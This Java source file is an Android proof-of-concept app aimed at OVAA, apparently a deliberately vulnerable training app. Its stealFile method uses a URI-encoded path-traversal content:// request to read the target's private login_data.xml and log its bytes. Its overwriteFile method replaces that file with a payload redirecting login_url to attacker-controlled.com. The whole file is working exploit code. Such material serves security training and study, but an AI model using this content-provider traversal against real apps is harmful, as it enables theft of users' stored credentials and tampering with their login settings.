package com.ari.ovvaexploit;

import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;

import java.io.*;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "OVAA_EXPLOIT";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        findViewById(R.id.btn_read).setOnClickListener(v -> stealFile());
        findViewById(R.id.btn_write).setOnClickListener(v -> overwriteFile());
    }

    private void stealFile() {
        // Target: OVAA's private database — not meant to be reachable by us at all
        String target = "../../../../data/data/oversecured.ovaa/shared_prefs/login_data.xml";
        String encodedTarget = Uri.encode(target, ""); // "" = don't leave ANY chars unescaped, including "/"

        Uri maliciousUri = Uri.parse("content://oversecured.ovaa.theftoverwrite/" + encodedTarget);
        Log.d(TAG, "Requesting URI: " + maliciousUri);

        try (InputStream is = getContentResolver().openInputStream(maliciousUri)) {
            if (is == null) {
                Log.e(TAG, "openInputStream returned null — file may not exist or path wrong");
                return;
            }
            ByteArrayOutputStream buffer = new ByteArrayOutputStream();
            byte[] chunk = new byte[4096];
            int len;
            while ((len = is.read(chunk)) != -1) {
                buffer.write(chunk, 0, len);
            }
            byte[] stolen = buffer.toByteArray();
            Log.d(TAG, "STOLEN " + stolen.length + " bytes");
            Log.d(TAG, "Hex dump (first 200 bytes): " + bytesToHex(stolen, 200));

        } catch (Exception e) {
            Log.e(TAG, "Exploit failed", e);
        }
    }

    private void overwriteFile() {
        String target = "../../../../data/data/oversecured.ovaa/shared_prefs/login_data.xml";
        String encodedTarget = Uri.encode(target, "");
        Uri maliciousUri = Uri.parse("content://oversecured.ovaa.theftoverwrite/" + encodedTarget);

        String payload = "<?xml version='1.0' encoding='utf-8' standalone='yes' ?>\n" +
                "<map>\n" +
                "    <string name=\"login_url\">http://attacker-controlled.com/</string>\n" +
                "    <string name=\"password\">pwned</string>\n" +
                "    <string name=\"email\">pwned@attacker.com</string>\n" +
                "</map>";

        try (OutputStream os = getContentResolver().openOutputStream(maliciousUri)) {
            if (os == null) {
                Log.e(TAG, "openOutputStream returned null");
                return;
            }
            os.write(payload.getBytes());
            os.flush();
            Log.d(TAG, "WRITE SUCCEEDED — overwrote login_data.xml");
        } catch (Exception e) {
            Log.e(TAG, "Write exploit failed", e);
        }
    }

    private String bytesToHex(byte[] bytes, int limit) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < Math.min(bytes.length, limit); i++) {
            sb.append(String.format("%02X ", bytes[i]));
        }
        return sb.toString();
    }
}
